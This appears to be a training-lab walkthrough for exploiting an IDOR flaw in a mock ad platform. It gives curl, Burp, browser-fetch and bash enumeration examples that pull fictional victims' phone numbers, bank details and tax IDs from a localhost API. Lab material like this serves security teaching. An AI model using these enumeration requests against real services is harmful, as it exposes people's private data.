<h1 class="doc-title">Exploitation Guide</h1>
<p class="doc-subtitle">Step-by-step walkthrough for exploiting the IDOR vulnerability</p>

<div class="section">
    <h2>Prerequisites</h2>
    <ul>
        <li>Access to the MTN MobAd platform</li>
        <li>Valid attacker credentials: <code>attacker@example.com:attacker123</code></li>
        <li>Browser with developer tools (or tools like Burp Suite, curl)</li>
        <li>Target email addresses to enumerate</li>
    </ul>
</div>

<div class="section">
    <h2>Method 1: Using the Built-in API Tester</h2>
    <p>The easiest way to exploit this vulnerability:</p>
    
    <ol>
        <li>
            <strong>Log in as the attacker:</strong>
            <div class="code-block">
Email: attacker@example.com
Password: attacker123
            </div>
        </li>
        <li>
            <strong>Navigate to the Dashboard</strong> and locate the "API Endpoint" section
        </li>
        <li>
            <strong>Click "Test API Endpoint"</strong> or go directly to <code>/api-test.php</code>
        </li>
        <li>
            <strong>Change the target email</strong> from your own to a victim's email:
            <div class="code-block">
<span class="comment">// Change from:</span>
attacker@example.com

<span class="comment">// To victim's email:</span>
victim1@mtnbusiness.com
            </div>
        </li>
        <li>
            <strong>Submit the request</strong> and observe the victim's PII in the response
        </li>
    </ol>
    
    <div class="success-box">
        <h4>‚úÖ Success Indicator</h4>
        <p>
            When successful, you'll see the victim's full profile including phone number, address, 
            notes, and other sensitive data. The lab will mark as solved automatically.
        </p>
    </div>
</div>

<div class="section">
    <h2>Method 2: Using Browser DevTools</h2>
    <p>For a more realistic exploitation approach:</p>
    
    <ol>
        <li>
            <strong>Log in</strong> as the attacker
        </li>
        <li>
            <strong>Open Developer Tools</strong> (F12) ‚Üí Network tab
        </li>
        <li>
            <strong>Visit the Dashboard</strong> and observe network requests
        </li>
        <li>
            <strong>Find the getUserNotes request</strong> in the Network tab
        </li>
        <li>
            <strong>Right-click ‚Üí "Copy as cURL"</strong>
        </li>
        <li>
            <strong>Modify the email parameter</strong> and replay:
            <div class="code-block">
curl 'http://localhost/AC/lab15/api/getUserNotes.php' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: PHPSESSID=your_session_id' \
  --data-raw '{
    "params": {
      "updates": [{
        "param": "user",
        "value": { "userEmail": "ceo@bigcorp.ng" },
        "op": "a"
      }]
    }
  }'
            </div>
        </li>
    </ol>
</div>

<div class="section">
    <h2>Method 3: Using Burp Suite</h2>
    <p>Professional penetration testing approach:</p>
    
    <ol>
        <li>Configure browser to proxy through Burp Suite</li>
        <li>Log in and navigate to the dashboard</li>
        <li>Intercept the API request in Proxy ‚Üí HTTP History</li>
        <li>Send to Repeater (Ctrl+R)</li>
        <li>
            Modify the userEmail parameter:
            <div class="code-block">
<span class="comment">// Original request body:</span>
{"params":{"updates":[{"param":"user","value":{"userEmail":"<span class="string">attacker@example.com</span>"},"op":"a"}]}}

<span class="comment">// Modified request body:</span>
{"params":{"updates":[{"param":"user","value":{"userEmail":"<span class="string">finance@acme.com.ng</span>"},"op":"a"}]}}
            </div>
        </li>
        <li>Click "Send" and examine the response</li>
    </ol>
    
    <div class="note-box">
        <h4>üí° Pro Tip: Intruder for Mass Enumeration</h4>
        <p>
            Use Burp Intruder to automate enumeration. Set the email parameter as the injection 
            point and load a list of target emails. This simulates how attackers extract data at scale.
        </p>
    </div>
</div>

<div class="section">
    <h2>Method 4: Using JavaScript Fetch</h2>
    <p>Exploit from browser console while logged in:</p>
    
    <div class="code-block">
<span class="comment">// Execute in browser console after logging in</span>

fetch('/AC/lab15/api/getUserNotes.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        params: {
            updates: [{
                param: 'user',
                value: { userEmail: 'admin@mtnmobad.com' },
                op: 'a'
            }]
        }
    })
})
.then(r => r.json())
.then(data => {
    console.log('=== LEAKED PII ===');
    console.log('Name:', data.user.full_name);
    console.log('Phone:', data.user.phone);
    console.log('Address:', data.user.address);
    console.log('Tax ID:', data.account_settings.tax_id);
    console.log('Bank:', data.account_settings.bank_account);
    console.log('Notes:', data.notes);
});
    </div>
</div>

<div class="section">
    <h2>Target Emails for Testing</h2>
    <p>The following accounts contain sensitive PII you can extract:</p>
    
    <table>
        <tr>
            <th>Email</th>
            <th>Role</th>
            <th>Sensitive Data</th>
        </tr>
        <tr>
            <td><code>victim1@mtnbusiness.com</code></td>
            <td>Business User</td>
            <td>Phone, address, business notes</td>
        </tr>
        <tr>
            <td><code>ceo@bigcorp.ng</code></td>
            <td>CEO</td>
            <td>Executive notes, strategic plans, high-value account</td>
        </tr>
        <tr>
            <td><code>finance@acme.com.ng</code></td>
            <td>Finance Manager</td>
            <td>Tax IDs, bank accounts, financial records</td>
        </tr>
        <tr>
            <td><code>admin@mtnmobad.com</code></td>
            <td>Platform Admin</td>
            <td>Master API keys, admin credentials, system notes</td>
        </tr>
        <tr>
            <td><code>developer@techstartup.io</code></td>
            <td>Developer</td>
            <td>API keys, integration secrets, technical notes</td>
        </tr>
    </table>
</div>

<div class="section">
    <h2>Expected Response</h2>
    <p>A successful exploit returns comprehensive PII:</p>
    
    <div class="code-block">
{
  "success": true,
  "user": {
    "id": 2,
    "email": "victim1@mtnbusiness.com",
    "full_name": "Adebayo Okonkwo",
    "phone": "+234 803 456 7890",
    "company": "Okonkwo Enterprises Ltd",
    "address": "15 Broad Street, Lagos Island, Lagos"
  },
  "notes": [
    {
      "title": "Bank Transfer Details",
      "content": "Account: 0123456789, Bank: GTBank, For: Campaign payments",
      "is_private": true
    },
    {
      "title": "Personal Reminder",
      "content": "Wife's birthday - June 15th. Order from Shoprite.",
      "is_private": true
    }
  ],
  "account_settings": {
    "tax_id": "TIN-12345678",
    "bank_account": "0123456789",
    "billing_address": "15 Broad Street, Lagos Island"
  },
  <span class="comment">// This flag indicates you accessed someone else's data</span>
  "_exploit": {
    "detected": true,
    "message": "You accessed another user's PII!"
  }
}
    </div>
</div>

<div class="section">
    <h2>Automated Enumeration Script</h2>
    <p>For security researchers testing at scale (use responsibly):</p>
    
    <div class="code-block">
<span class="comment">#!/bin/bash</span>
<span class="comment"># IDOR PII Enumeration Script</span>
<span class="comment"># Usage: ./enum.sh session_id</span>

SESSION=$1
EMAILS=(
    "victim1@mtnbusiness.com"
    "ceo@bigcorp.ng"
    "finance@acme.com.ng"
    "admin@mtnmobad.com"
)

for email in "${EMAILS[@]}"; do
    echo "[*] Querying: $email"
    curl -s 'http://localhost/AC/lab15/api/getUserNotes.php' \
        -H 'Content-Type: application/json' \
        -H "Cookie: PHPSESSID=$SESSION" \
        --data-raw "{\"params\":{\"updates\":[{\"param\":\"user\",\"value\":{\"userEmail\":\"$email\"},\"op\":\"a\"}]}}" \
        | jq '.user.full_name, .user.phone, .account_settings.bank_account'
    echo "---"
done
    </div>
</div>

<div class="warning-box">
    <h4>‚ö†Ô∏è Ethical Reminder</h4>
    <p>
        These techniques are demonstrated in a controlled lab environment. Never attempt to 
        exploit IDOR vulnerabilities on systems you don't own or have explicit permission to test.
    </p>
</div>
